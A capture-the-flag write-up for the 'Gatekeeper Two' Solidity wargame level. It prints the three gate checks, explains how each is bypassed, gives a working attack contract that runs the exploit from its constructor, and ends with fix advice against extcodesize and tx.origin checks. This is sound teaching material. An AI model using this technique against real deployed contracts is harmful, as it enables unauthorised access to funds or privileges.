# Level 14: Gatekeeper Two

## Goal

Pass three gates and register as the entrant.

## The contract

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
modifier gateTwo() {
    uint256 x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
}
modifier gateThree(bytes8 _gateKey) {
    require(
        uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey)
        == type(uint64).max
    );
    _;
}
```

## Vulnerability

- **gateOne**: call via a contract so `msg.sender != tx.origin`.
- **gateTwo** (`extcodesize(caller()) == 0`): a deployed contract has code size > 0, so this seems to block contracts. But **during a contract's constructor, its code is not yet stored**, so `extcodesize` of the caller is 0. Run the whole exploit inside the constructor.
- **gateThree**: solve for the key with XOR. Since `a ^ key == max` means `key = a ^ max = ~a`:
  `key = ~uint64(keccak256(abi.encodePacked(address(this))))`.

## Exploit

```solidity
contract GatekeeperTwoAttack {
    constructor(address target) {
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
            ^ type(uint64).max
        );
        GatekeeperTwo(target).enter(key);
    }
}
```

Deploying the contract runs the constructor, where `extcodesize(address(this))` is still 0, satisfying gateTwo, and the crafted key satisfies gateThree.

## Fix

- `extcodesize == 0` does **not** prove the caller is an EOA; it is trivially bypassed from a constructor.
- Do not use code-size checks or `tx.origin` as security boundaries.
- Never build access control on properties an attacker can spoof.

## Takeaway

The "is the caller a contract?" check via `extcodesize` is a known false-security pattern: a contract calling from its constructor reports zero code size.
